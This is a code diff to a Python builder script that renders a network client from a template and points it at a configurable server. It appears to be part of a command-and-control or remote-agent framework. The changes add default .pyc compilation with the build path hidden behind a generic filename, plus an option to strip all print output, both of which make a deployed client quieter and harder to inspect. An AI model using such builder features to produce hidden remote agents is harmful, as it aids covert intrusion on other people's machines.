@@ -1,4 +1,7 @@
 import argparse
+import py_compile
+import shutil
+import tempfile
 
 from pathlib import Path
 from jinja2 import Environment, FileSystemLoader, select_autoescape
@@ -14,11 +17,10 @@ def add_arguments(parser):
         action="store_true",
         help="Run client from a non-main thread destination (not CTRL+C-safe for websockets).",
     )
-    builder.add_argument(
-        "--no-obfuscate",
-        action="store_true",
-        help="Don't obfuscate the client.",
-    )
+    builder.add_argument("--no-compile", action="store_true",
+                     help="Skip .pyc compilation and output raw source.")
+    builder.add_argument("--no-print", action="store_true",
+                     help="Strip all print output from the generated client.")
 
     cfg = parser.add_argument_group("Client configuration")
     cfg.add_argument("--server-url", default="localhost:8080",
@@ -63,7 +65,25 @@ def build(args):
     out_path.parent.mkdir(parents=True, exist_ok=True)
     out_path.write_text(rendered, encoding="utf-8")
 
-    print("[+] Wrote Python client to '{}'".format(out_path))
+    if args.no_compile:
+        print(f"[+] Wrote Python client to '{out_path}'")
+    else:
+        pyc_path = out_path.with_suffix(".pyc")
+        tmp = Path(tempfile.mkdtemp())
+        try:
+            generic_name = tmp / out_path.name
+            shutil.copy2(out_path, generic_name)
+            py_compile.compile(
+                str(generic_name), cfile=str(pyc_path), doraise=True
+            )
+            out_path.unlink()
+            print(f"[+] Compiled Python client to '{pyc_path}'")
+        except py_compile.PyCompileError as e:
+            print(f"[!] Compilation failed: {e}")
+            print(f"[*] Source written to '{out_path}'")
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
     if args.proxy:
         print("[!] Warning: ws:// through an HTTP proxy may fail — aiohttp sends it in absolute form instead of using CONNECT. Use wss:// with a proxy.")
 
